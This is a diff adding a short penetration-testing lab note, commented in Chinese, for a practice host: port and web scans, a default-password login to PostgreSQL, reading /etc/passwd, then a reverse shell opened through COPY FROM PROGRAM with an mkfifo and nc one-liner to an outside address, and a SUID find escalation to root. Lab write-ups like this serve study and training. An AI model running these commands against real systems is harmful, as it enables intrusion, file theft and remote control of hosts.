@@ -1,0 +1,32 @@
+nmap -sV -sC -Pn 192.168.199.47 > nmap.txt
+nmap -p- -T5 192.168.199.47 > nmapall.txt
+nikto -h http://192.168.199.47 > nikto.txt
+gobuster dir  -u http://192.168.199.47/ -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster.txt
+
+enum4linux 192.168.199.47 > enum4linun.txt
+
+
+nmap --script vuln -sV -p 21,22,80,139,445,5437 192.168.199.47  > nmapvuln.txt
+
+PostgreSQL數據庫
+
+1.nmap掃描有ftp,smb,web但無所獲
+2.嘗試全端口掃描發現有5437的postgres
+3.嘗試使用默認密碼登入postgres
+psql -h 192.168.199.47 -U postgres -p 5437 默認密碼postgres
+4.根據hacktrick使用postgresSQL操作shell
+https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection
+5.可以查看及寫入一行指令
+select * from pg_ls_dir('/home/wilson');
+select * from pg_read_file('/etc/passwd' , 0 , 1000000);
+copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
+6.根據postgreSQL9.3有command-execution
+https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
+7.取的reverse shell
+DROP TABLE IF EXISTS timmy;
+CREATE TABLE timmy(cmd_output text);
+COPY timmy FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.199 80 >/tmp/f';
+SELECT * FROM timmy;
+DROP TABLE IF EXISTS timmy;
+8.使用LinEnum發現有SUID find
+根據gtfobin提權到root
